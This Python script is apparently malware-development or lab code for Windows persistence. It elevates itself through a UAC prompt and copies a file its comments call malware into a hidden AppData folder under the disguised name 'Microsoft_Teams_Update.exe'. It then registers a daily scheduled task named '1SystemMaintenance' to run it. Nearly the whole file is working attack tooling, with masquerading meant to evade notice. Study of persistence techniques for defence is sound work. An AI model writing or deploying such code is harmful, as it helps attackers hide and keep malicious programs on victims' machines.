import subprocess
import sys
import os
import ctypes
import shutil


def is_admin():
    """Check if the script is running with administrator privileges"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
    
def run_as_admin():
    """Re-run the script with administrator privileges"""
    if not is_admin():
        print("[!] Requesting administrator privileges...")
        script = os.path.abspath(sys.argv[0])
        params = " ".join([script] + sys.argv[1:])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)

def create_scheduled_task():
    """
    Creates a scheduled task that runs on user logon for persistence.
    """
    task_name = "1SystemMaintenance" 

    # Find current malware directory
    current_dir = os.path.dirname(__file__)  
    current_malware = os.path.join(current_dir, "helloWorld.exe")
    
    # Target location to hide the executable
    target_dir = os.path.expanduser("~\\AppData\\Local\\Microsoft\\Testing\\")
    exe_path = os.path.join(target_dir, "Microsoft_Teams_Update.exe") # Name can be anything to blend in
    
    shutil.copy2(current_malware, exe_path)
    
    print(f"[*] Attempting to create scheduled task: {task_name}")
    print(f"[*] Target executable: {exe_path}")
    print(f"[*] Trigger: onlogon")

    command = [
        'schtasks', '/create', '/tn', task_name, 
        '/tr', f'"{exe_path}"',
        '/sc', 'daily', '/st', '21:40',
        # '/ru', os.getlogin(),
        '/f'  # Force creation
    ]
    
    try:
        # Execute the command
        result = subprocess.run(command, capture_output=True, text=True, shell=True)
        
        if result.returncode == 0:
            print(f"[+] Successfully created scheduled task: {task_name}")
            return True
        else:
            print(f"[-] Failed to create task. Error: {result.stderr}")
            return False
            
    except Exception as e:
        print(f"[-] Exception occurred: {e}")
        return False

def verify_task_creation(task_name):
    """Verifies if the task was created successfully."""
    try:
        result = subprocess.run(
            ['schtasks', '/query', '/tn', task_name, '/fo', 'list'],
            capture_output=True, text=True, check=True
        )
        print(f"[+] Verification successful - task exists in Task Scheduler")
        return True
    except subprocess.CalledProcessError:
        print(f"[-] Verification failed - task not found in Task Scheduler")
        return False
# verify
def check_task_in_scheduler_gui():
    """Instructions for manually checking the task"""
    print("\n" + "="*50)
    print("TO VERIFY IN TASK SCHEDULER GUI:")
    print("1. Press Windows Key + R")
    print("2. Type: taskschd.msc")
    print("3. Press Enter")
    print("4. Expand 'Task Scheduler Library'")
    print("5. Look for your task name in the list")
    print("="*50)

if __name__ == "__main__":
    
    if not is_admin():
        run_as_admin()
        sys.exit()

        print("[!] Running without administrator privileges")
        print("[!] Task will be created for current user only")
    
    task_name = "1SystemMaintenance"
    
    if create_scheduled_task():
        verify_task_creation(task_name)
        check_task_in_scheduler_gui()
    else:
        print("[-] Task creation failed.")
        
    os.system("pause")
